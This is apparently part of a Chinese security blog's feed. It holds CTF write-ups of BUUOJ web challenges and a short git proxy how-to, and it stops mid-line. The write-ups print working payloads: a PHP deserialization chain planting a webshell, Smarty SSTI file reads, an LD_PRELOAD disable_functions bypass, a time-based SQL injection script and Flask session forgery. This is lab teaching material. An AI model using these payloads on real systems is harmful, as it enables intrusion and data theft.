pass</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    foo()</span><br><span class="line">    print(&#39;ok&#39;)</span><br></pre></td></tr></table></figure><p>可以在结果发现，172.16.233.111开放了80，873，9000端口，继续写脚本探测80端口：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python3</span><br><span class="line">import urllib.request</span><br><span class="line">import time</span><br><span class="line">HEADERS &#x3D; &#123;&#39;user-agent&#39;: (&#39;Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_10_5)&#39;</span><br><span class="line">                          &#39;AppleWebKit&#x2F;537.36 (KHTML, like Gecko)&#39;</span><br><span class="line">                          &#39;Chrome&#x2F;45.0.2454.101 Safari&#x2F;537.36&#39;),</span><br><span class="line">           &#39;referer&#39;: &#39;http:&#x2F;&#x2F;172.16.233.111&#x2F;index.html&#39;,</span><br><span class="line">           &#39;X-Forwared-For&#39;: &#39;127.0.0.1&#39;</span><br><span class="line">           &#125;</span><br><span class="line">file &#x3D; urllib.request.Request(&quot;http:&#x2F;&#x2F;172.16.233.111:80&#x2F;&quot;, headers&#x3D;HEADERS)</span><br><span class="line"> </span><br><span class="line">data &#x3D; urllib.request.urlopen(file)</span><br><span class="line"> </span><br><span class="line">print(data.headers)</span><br><span class="line">print(data.read().decode(&#39;utf-8&#39;))</span><br></pre></td></tr></table></figure><p><img src="/2020/03/19/%E7%94%B1%E4%B8%80%E9%81%93%E5%85%A5%E7%BE%A4%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/image-20200215231542666.png" alt></p><p>老高做的时候用net_curl命令进行探测</p><p><img src="/2020/03/19/%E7%94%B1%E4%B8%80%E9%81%93%E5%85%A5%E7%BE%A4%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/image-20200319134817242.png" alt></p><p>873对应Rsync，9000对应FPM。我们先试试9000的FPM漏洞。</p><p>利用在Phithon牛一篇文章（<a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html）中的脚本（https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75）读取一下目录" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html）中的脚本（https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75）读取一下目录</a></p><p><img src="/2020/03/19/%E7%94%B1%E4%B8%80%E9%81%93%E5%85%A5%E7%BE%A4%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/image-20200215233458653.png" alt></p><p>发现存在flag，但是没有权限读取。利用rsync可以读取flag</p><p>简单来说rsync是可以实现增量备份的工具，默认端口为873</p><blockquote><p>rsync可以实现scp的远程拷贝(rsync不支持远程到远程的拷贝，但scp支持)、cp的本地拷贝、rm删除和”ls -l”显示文件列表等功能</p></blockquote><p>这里要关注的是rsync daemon模式</p><blockquote><p>rsync daemon是向外提供服务的，这样只要告诉了别人rsync的url路径，外人就能向ftp服务器一样获取文件列表并进行选择性地下载</p></blockquote><p>所以我们可以利用这一点获取rsync允许访问目录下的文件。</p><blockquote><p>rsync daemon是”rsync  –daemon”或再加上其他一些选项启动的，它会读取配置文件，默认是/etc/rsyncd.conf，并默认监听在873端口上，当外界有客户端对此端口发起连接请求，通过这个网络套接字就可以完成连接，以后与该客户端通信的所有数据都通过该网络套接字传输。</p></blockquote><p>根据这篇文章介绍的<a href="https://www.cnblogs.com/f-ck-need-u/p/7220009.html#auto_id_0" target="_blank" rel="noopener">https://www.cnblogs.com/f-ck-need-u/p/7220009.html#auto_id_0</a></p><p>首先查看<code>/etc/rsyncd.conf</code></p><p><img src="/2020/03/19/%E7%94%B1%E4%B8%80%E9%81%93%E5%85%A5%E7%BE%A4%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/image-20200215233930976.png" alt></p><p>定义了模块<code>src</code>，路径中包含flag，<br> 那么可以使用命令<code>rsync 127.0.0.1::src/7h1s_i5_f14g /tmp/</code>将flag备份出来</p><p><img src="/2020/03/19/%E7%94%B1%E4%B8%80%E9%81%93%E5%85%A5%E7%BE%A4%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/image-20200215234020817.png" alt></p><p>参考资料：</p><blockquote><p><a href="https://tiaonmmn.github.io/2019/09/09/BUUOJ%E5%88%B7%E9%A2%98-Web-ctf473831530-2018-web-virink-web/" target="_blank" rel="noopener">https://tiaonmmn.github.io/2019/09/09/BUUOJ%E5%88%B7%E9%A2%98-Web-ctf473831530-2018-web-virink-web/</a></p><p><a href="https://www.cnblogs.com/20175211lyz/p/12239018.html" target="_blank" rel="noopener">https://www.cnblogs.com/20175211lyz/p/12239018.html</a></p><p><a href="https://www.youncyb.cn/?p=435" target="_blank" rel="noopener">https://www.youncyb.cn/?p=435</a></p><p>weevely用法：<a href="https://www.cnblogs.com/yufusec/p/9245618.html" target="_blank" rel="noopener">https://www.cnblogs.com/yufusec/p/9245618.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透方向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
            <tag> buuoj </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git配置代理</title>
      <link href="/2020/03/19/Git%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86/"/>
      <url>/2020/03/19/Git%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>由于本地git clone下载速度慢，配置一下git代理后，速度下载快了很多。</p><h3 id="步骤过程"><a href="#步骤过程" class="headerlink" title="步骤过程"></a>步骤过程</h3><ol><li>本地代理工具的端口是10808，在 <code>Git</code> 命令行输入以下配置全局代理：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//127.0.0.1指的是本地，10808指的是代理工具设置的端口</span><br><span class="line">git config --global http.proxy socks5://127.0.0.1:10808</span><br></pre></td></tr></table></figure><ol start="2"><li>使用以下命令查看是否配置好</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global -e</span><br></pre></td></tr></table></figure><p>打开后有如图所示，即配置成功。</p><p><img src="/2020/03/19/Git%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86/image-20200319101136987.png" alt></p><ol start="3"><li>取消代理使用命令</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global --<span class="built_in">unset</span> http.proxy</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> git代理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUOJ-web刷题（二）</title>
      <link href="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h3 id="0x-01-强网杯-2019-Upload"><a href="#0x-01-强网杯-2019-Upload" class="headerlink" title="0x 01 强网杯 2019]Upload"></a>0x 01 强网杯 2019]Upload</h3><ul><li><p>考点</p><p>代码审计，PHP 反序列化</p></li><li><p>解题过程</p></li></ul><ol><li>目录扫描发现 /<a href="http://www.tar.gz敏感文件，下载下来进行审计，存在" target="_blank" rel="noopener">www.tar.gz敏感文件，下载下来进行审计，存在</a> .idea 目录，拖入Phpstrom查看，发现存在两处断点,猜测是出题人的提示</li></ol><p>application/web/controller/Index.php：</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200319110910722.png" alt></p><p>application/web/controller/Register.php：</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200319111027954.png" alt></p><ol start="2"><li>审计代码发现：①Register.php注册，有<strong>destruct()函数，想判断注没注册，没注册的给调用 check 也就是 Index 的 index 方法②Index.php，最主要的就是login_check函数，并且发现其他函数执行前一般都会调用这个，应该是检查有没有登陆，最关键的是把cookie(‘user’)反序列化了，所以payload应该放在cookie(‘user’)里。③Profile.php，对文件进行操作，有__</strong>get,__call方法<br><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200319112709035.png" alt></li></ol><p>在upload_img方法中</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200319112809487.png" alt></p><p>先login_check检查登陆，然后判断上传的文件是否为空，不为空则将文件信息赋值给<br> $this-&gt;filename_tmp，将文件名md5加密并拼接png赋值给$this-&gt;filename，进入ext_check判断后缀是否为png，将结果给$this-&gt;ext</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200319112855911.png" alt></p><ol start="3"><li>利用思路：我们先上传一个图片马，然后将filename_tmp=图片马路径，filename=xxx.php，经过复制便可达到getshell，所以要想办法在不上传文件的情况下调用upload_img</li></ol><p>回到入口函数：<br> Register::__destruct()进入if，调用$this-&gt;checker的index()，将$this-&gt;checker=new Profile()，会调用Profile::_call:</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200319113057678.png" alt></p><p>那么此时$this-&gt;name=index，$args为空，进入if的代码就变成了：<code>$this-&gt;index();</code></p><p>调用了该类中不存在的成员变量，触发_get魔术方法</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200319113233704.png" alt></p><p>_get会返回$this-&gt;except[‘index’]，也就是$this-&gt;except<a href>‘index’</a>，只要将except[‘index’]=upload_img就能调用了</p><ol start="4"><li>先利用蚁剑生成webshell，然后使用十六进制工具复制进正常图片的结尾处</li></ol><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200319113647891.png" alt></p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200319113557518.png" alt></p><p>注册账号上传图片，得到图片路径</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200319114124209.png" alt></p><p>生成poc:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace app\web\controller;</span><br><span class="line">class Register&#123;</span><br><span class="line">public $checker;</span><br><span class="line">    public $registed;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">    &#x2F;&#x2F;确保进入if</span><br><span class="line">    $this-&gt;registed &#x3D; 0;</span><br><span class="line">        $this-&gt;checker &#x3D; new Profile();</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line">namespace app\web\controller;</span><br><span class="line">class Profile&#123;</span><br><span class="line">    public $filename_tmp;</span><br><span class="line">    public $filename;</span><br><span class="line">    public $ext;</span><br><span class="line">    public $except;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">    $this-&gt;except&#x3D;[&#39;index&#39;&#x3D;&gt;&#39;upload_img&#39;];</span><br><span class="line">    $this-&gt;filename_tmp &#x3D;&quot;.&#x2F;upload&#x2F;76d9f00467e5ee6abc3ca60892ef304e&#x2F;4a47a0db6e60853dedfcfdf08a5ca249.png&quot;;</span><br><span class="line">    $this-&gt;filename &#x3D; &quot;.&#x2F;upload&#x2F;shell.php&quot;;</span><br><span class="line">    $this-&gt;ext&#x3D;&quot;png&quot;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo base64_encode(serialize(new Register()));</span><br></pre></td></tr></table></figure><p>将cookie替换成生成的结果，刷新页面，访问shell.php</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200319114414679.png" alt></p><p>连接蚁剑，得到flag</p><p>参考资料：</p><blockquote><p><a href="https://blog.csdn.net/chasingin/article/details/104374416" target="_blank" rel="noopener">https://blog.csdn.net/chasingin/article/details/104374416</a></p><p><a href="https://www.zhaoj.in/read-5873.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-5873.html</a></p></blockquote><h3 id="0x-02-CISCN2019-华东南赛区-Web11"><a href="#0x-02-CISCN2019-华东南赛区-Web11" class="headerlink" title="0x 02 [CISCN2019 华东南赛区]Web11"></a>0x 02 [CISCN2019 华东南赛区]Web11</h3><ul><li><p>考点</p><p>Smarty SSTI</p></li><li><p>解题过程</p></li></ul><ol><li><p>题目提醒<code>Build With Smarty</code>，猜测应该是<code>smarty ssti</code>，右上角显示了<code>IP</code>，猜测注入点应该再<code>X-Forwarded-For</code>3.1.30</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200319235007674.png" alt></p><ol start="2"><li>设置<code>X-Forwarded-For</code>为<code>{7+7}</code>，在<code>current ip</code> 处回显<code>14</code>，确实在这里存在<code>ssti</code></li></ol></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;node3.buuoj.cn:25138&#x2F;xff&#x2F; -H &quot;X-Forwarded-For: &#123;&#123;7+7&#125;&#125;&quot;   &#x2F;&#x2F;返回14</span><br><span class="line">curl http:&#x2F;&#x2F;node3.buuoj.cn:25138&#x2F;xff&#x2F; -H &quot;X-Forwarded-For: &#123;$smarty.version&#125;&quot;   &#x2F;&#x2F;返回3.1.30</span><br><span class="line"></span><br><span class="line">使用if标签执行命令</span><br><span class="line">curl http:&#x2F;&#x2F;node3.buuoj.cn:25138&#x2F;xff&#x2F; -H &quot;X-Forwarded-For: &#123;if readfile(&#39;&#x2F;flag&#39;)&#125;&#123;&#x2F;if&#125;&quot;</span><br></pre></td></tr></table></figure><p>参考资料：</p><blockquote><p><a href="https://www.freebuf.com/column/219913.html" target="_blank" rel="noopener">https://www.freebuf.com/column/219913.html</a></p></blockquote><h3 id="0x-03-Wallbreaker-Easy"><a href="#0x-03-Wallbreaker-Easy" class="headerlink" title="0x 03 Wallbreaker_Easy"></a>0x 03 Wallbreaker_Easy</h3><ul><li><p>考点</p><p>disable_function bypass</p></li><li><p>解题过程</p></li></ul><ol><li>攻击思路</li></ol><p>利用<code>Imagick()</code>中会触发<code>php解释器向外开启系统进程</code>的方法，这里的思路是当传入<code>MPEG</code>格式类型的文件时候，为了转换格式会向外部环境请求并触发<code>ffmpeg</code>的调用，从而开启新的进程。在开启时，环境变量<code>LD_PRELOAD</code>会首先加载，而我们事先会将我们的<code>恶意共享文件hack.so在这个环境变量中指出来</code>，即<code>LD_PRELOAD={DIR}/hack.so</code>。hack.so共享文件由hack.c文件编译，其中调用了<code>__attribute__((constructor))</code>，该方法会在共享文件被加载的时候率先被执行。</p><ol start="2"><li>编写hack.c</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">__attribute__ ((__constructor__)) void angel (void)&#123;</span><br><span class="line">    system(&quot;&#x2F;readflag &gt; &#x2F;tmp&#x2F;8810490ee01835952ff9359d77cce4bd&#x2F;lxj.txt&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用命令<code>gcc --share -fPIC hack.c -o hack.so</code>命令来编译共享文件</p><p>获取so文件的base64值：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">file_put_contents(<span class="string">'1.txt'</span>,base64_encode(file_get_contents(<span class="string">'P3rh4ps.so'</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上传文件并执行</p><p>一打就崩。。。。</p><p>参考资料：</p><blockquote><p><a href="https://p3rh4ps.top/index.php/2020/01/12/20-1-12-总结/" target="_blank" rel="noopener">https://p3rh4ps.top/index.php/2020/01/12/20-1-12-%E6%80%BB%E7%BB%93/</a></p><p><a href="https://glotozz.github.io/2020/02/26/从一道题学习bypass-disable-func/#一-dl-拓展库绕过" target="_blank" rel="noopener">https://glotozz.github.io/2020/02/26/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0bypass-disable-func/#%E4%B8%80-dl-%E6%8B%93%E5%B1%95%E5%BA%93%E7%BB%95%E8%BF%87</a></p><p><a href="https://ch4ser-go.github.io/2019/12/26/LD-PRELOAD劫持类型题目/" target="_blank" rel="noopener">https://ch4ser-go.github.io/2019/12/26/LD-PRELOAD%E5%8A%AB%E6%8C%81%E7%B1%BB%E5%9E%8B%E9%A2%98%E7%9B%AE/</a></p><p><a href="https://skysec.top/2019/03/25/2019-0CTF-Web-WriteUp/" target="_blank" rel="noopener">https://skysec.top/2019/03/25/2019-0CTF-Web-WriteUp/</a></p></blockquote><h3 id="0x-04-SWPU2019-Web4"><a href="#0x-04-SWPU2019-Web4" class="headerlink" title="0x 04 [SWPU2019]Web4"></a>0x 04 [SWPU2019]Web4</h3><ul><li><p>考点</p><p>堆叠注入</p></li><li><p>解题过程</p></li></ul><ol><li><p>题目打开是一个登陆页面，输入账号密码后点击登陆页面无任何相应，注册功能也是尚未开放。查看源代码可以看到一个js文件，F12也可以看到一个网络请求。</p><p>js主要功能是将username和password以json格式然后发给index.php?r=Login/Login。</p><p>抓包进行测试发现username中加入单引号会直接500错误，而闭合引号后会正常显示。证明存在注入点，但是过滤了select,if,sleep,substr等大多数注入常见的单词。在单引号后加入分号(;)，若无法多语句执行，返回页面按理说应该是500，但在这里可以看到正常回显，说明可能存在堆叠入。</p></li></ol><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200323000349366.png" alt></p><ol start="2"><li>在这里我们就可以用16进制+<a href="https://dev.mysql.com/doc/refman/5.7/en/sql-prepared-statements.html" target="_blank" rel="noopener">mysql预处理</a>来绕过。</li></ol><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/E:%5CHexo-Blog%5Csource_posts%5CBUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89%5Ct01c4535f91421496d4.png" alt></p><p>这里偷个懒，使用官方wp的脚本跑了一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;python3</span><br><span class="line">#author: c1e4r</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    #题目地址</span><br><span class="line">    url &#x3D; &#39;&#39;&#39;http:&#x2F;&#x2F;925fe2df-66f2-40c3-b13d-5b86e079f231.node3.buuoj.cn&#x2F;index.php?r&#x3D;Login&#x2F;Login&#39;&#39;&#39;</span><br><span class="line">    #注入payload</span><br><span class="line">    payloads &#x3D; &quot;asd&#39;;set @a&#x3D;0x&#123;0&#125;;prepare ctftest from @a;execute ctftest-- -&quot;</span><br><span class="line">    flag &#x3D; &#39;&#39;</span><br><span class="line">    for i in range(1,30):</span><br><span class="line">        #查询payload</span><br><span class="line">        payload &#x3D; &quot;select if(ascii(substr((select flag from flag),&#123;0&#125;,1))&#x3D;&#123;1&#125;,sleep(3),1)&quot;</span><br><span class="line">        for j in range(0,128):</span><br><span class="line">            #将构造好的payload进行16进制转码和json转码</span><br><span class="line">            datas &#x3D; &#123;&#39;username&#39;:payloads.format(str_to_hex(payload.format(i,j))),&#39;password&#39;:&#39;test213&#39;&#125;</span><br><span class="line">            data &#x3D; json.dumps(datas)</span><br><span class="line">            times &#x3D; time.time()</span><br><span class="line">            res &#x3D; requests.post(url &#x3D; url, data &#x3D; data)</span><br><span class="line">            if time.time() - times &gt;&#x3D; 3:</span><br><span class="line">                flag &#x3D; flag + chr(j)</span><br><span class="line">                print(flag)</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">def str_to_hex(s):</span><br><span class="line">    return &#39;&#39;.join([hex(ord(c)).replace(&#39;0x&#39;, &#39;&#39;) for c in s])</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>得到<code>glzjin_wants_a_girl_friend.zip</code>，访问得到源代码包。</p><ol start="3"><li>审计代码发现是一个简单的mvc框架。</li></ol><p>url大致的解析流程：从r参数中获取要访问的Controller以及Action,然后以/分隔开后拼接成完整的控制器名。以Login/Index为例，就是将Login/Index分隔开分别拼接成LoginController以及actionIndex,然后调用LoginController这个类中的actionIndex方法。每个action里面会调用对应的loadView()方法进行模版渲染，然后将页面返回给客户端。若访问的Controller不存在则默认解析Login/Index。</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200323001018876.png" alt></p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200323001209515.png" alt></p><p>其中 ,BaseController的loadView方法发现使用了extract，后面又include了一个文件。那么意味着只要$viewData可控我们即可覆盖掉$this-&gt;viewPath文件中的某些变量。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;Controller&#x2F;UserController.php</span><br><span class="line">public function actionIndex()</span><br><span class="line">&#123;</span><br><span class="line">    $listData &#x3D; $_REQUEST;</span><br><span class="line">    $this-&gt;loadView(&#39;userIndex&#39;,$listData);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>$listData是从REQUEST提取出来的，完全可控。而其对应的/View/userIndex.php中存在一个文件读取。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;View&#x2F;userIndex.php</span><br><span class="line">if(!isset($img_file)) &#123;</span><br><span class="line">$img_file &#x3D; &#39;&#x2F;..&#x2F;favicon.ico&#39;;</span><br><span class="line">&#125;</span><br><span class="line">$img_dir &#x3D; dirname(__FILE__) . $img_file;</span><br><span class="line">$img_base64 &#x3D; imgToBase64($img_dir);</span><br><span class="line">echo &#39;&lt;img src&#x3D;&quot;&#39; . $img_base64 . &#39;&quot;&gt;&#39;;</span><br></pre></td></tr></table></figure><p>$img_file可通过extract($viewData)变量覆盖漏洞完全控制，而$viewData是受用户控制的完全控制的。所以这里就存在一个任意文件读取漏洞。</p><p>访问：<code>925fe2df-66f2-40c3-b13d-5b86e079f231.node3.buuoj.cn/index.php?r=User/Index&amp;img_file=/../flag.php</code>即可得到base64编码的flag</p><h3 id="0x-05-SWPU2019-Web3"><a href="#0x-05-SWPU2019-Web3" class="headerlink" title="0x 05 [SWPU2019]Web3"></a>0x 05 [SWPU2019]Web3</h3><ul><li><p>考点</p><p>flask-session伪造、linux相关知识</p></li><li><p>解题过程</p></li></ul><p>1、页面打开是一个登陆界面，随便输入用户名和密码即可成功登入，有一个上传功能，但是点进去提示<code>Permission denied!</code>，需要管理员权限。右键查看源代码发现题目提示<code>404 not found</code></p><blockquote><p>在 flask 中，可以使用 app.errorhandler()装饰器来注册错误处理函数，参数是 HTTP 错误状态码或者特定的异常类，由此我们可以联想到在 404 错误中会有东西存在。</p></blockquote><p>访问一个不存在的路由：/logina，显示<code>404 not found</code>，在 HTTP 头中我们可以看到一串 base64 字符串，解码后可以得到 secret_key:<code>keyqqqwwweee!@#$%^&amp;*</code></p><ol start="2"><li>使用<code>flask_session_cookie_manager3.py</code>来伪造cookie，<strong>注意要在linux环境下运行</strong></li></ol><p>解密session得到：<code>{&#39;id&#39;: b&#39;100&#39;, &#39;is_login&#39;: True, &#39;password&#39;: &#39;123&#39;, &#39;username&#39;: &#39;123&#39;}</code></p><p>修改 id=b’1’，得到cookie</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_manager.py encode -s &quot;keyqqqwwweee!@#$%^&amp;*&quot; -t &quot;&#123;&#39;id&#39;: b&#39;1&#39;, &#39;is_login&#39;: True, &#39;password&#39;: &#39;123&#39;, &#39;username&#39;: &#39;123&#39;&#125;&quot;</span><br><span class="line">eyJpZCI6eyIgYiI6Ik1RPT0ifSwiaXNfbG9naW4iOnRydWUsInBhc3N3b3JkIjoiMTIzIiwidXNlcm5hbWUiOiIxMjMifQ.XnSu2A.SeLyR45y3lQcF1dRjwzQw5Y-3TE</span><br><span class="line">这里我们伪造id:b&#39;1&#39;的用户session进行登录</span><br></pre></td></tr></table></figure><p>成功登陆，得到如下</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200323151641468.png" alt></p><p>右键查看源代码，里面有 upload()和 showflag()两个函数的源代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">upload()关键代码：</span><br><span class="line">basepath&#x3D;os.path.dirname(os.path.realpath(__file__))</span><br><span class="line">path &#x3D; basepath+&#39;&#x2F;upload&#x2F;&#39;+md5_ip+&#39;&#x2F;&#39;+md5_one+&#39;&#x2F;&#39;+session[&#39;username&#39;]+&quot;&#x2F;&quot;</span><br><span class="line">path_base &#x3D; basepath+&#39;&#x2F;upload&#x2F;&#39;+md5_ip+&#39;&#x2F;&#39;</span><br><span class="line">filename &#x3D; f.filename</span><br><span class="line">pathname &#x3D; path+filename</span><br><span class="line">if &quot;zip&quot; !&#x3D; filename.split(&#39;.&#39;)[-1]:</span><br><span class="line">    return &#39;zip only allowed&#39;</span><br><span class="line">......</span><br><span class="line">try:</span><br><span class="line">    cmd &#x3D; &quot;unzip -n -d &quot;+path+&quot; &quot;+ pathname</span><br><span class="line">    if cmd.find(&#39;|&#39;) 